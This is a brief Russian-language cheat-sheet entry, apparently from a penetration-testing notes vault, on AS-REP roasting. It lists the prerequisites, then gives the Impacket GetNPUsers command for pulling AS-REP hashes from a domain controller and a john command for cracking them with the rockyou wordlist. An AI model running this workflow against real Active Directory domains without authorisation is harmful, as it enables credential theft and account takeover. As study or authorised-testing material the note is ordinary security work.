#tool #windows #kerberos 

Инструмент из пакета **[[Impacket]]**, который позволяет **получить Kerberos TGT/AS-REP данные для пользователей без Pre-Auth**.  
Главная цель — получить **hash**, который можно использовать для **offline brute-force** или **pass-the-hash/AS-REP roasting**.

### **Условия для применения**

1) Домен Active Directory
На целевом хосте должен быть **Domain Controller**.
2) Наличие списка пользователей users.txt
3) Доступ к LDAP/Kerberos
```bash
88/tcp  (Kerberos) 
389/tcp (LDAP)
```

4) Пользователь должен иметь **включенный флаг “Do not require Kerberos preauthentication”**

### Использование

```bash
impacket-GetNPUsers -dc-ip <ip> <domain>/ -usersfile users.txt -outputfile users.asrep -format john
```


### Импакт

На выходе получается файл в котором собран хэш AS-REP, который далее мы брутфорсим чреез john

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt users.asrep
```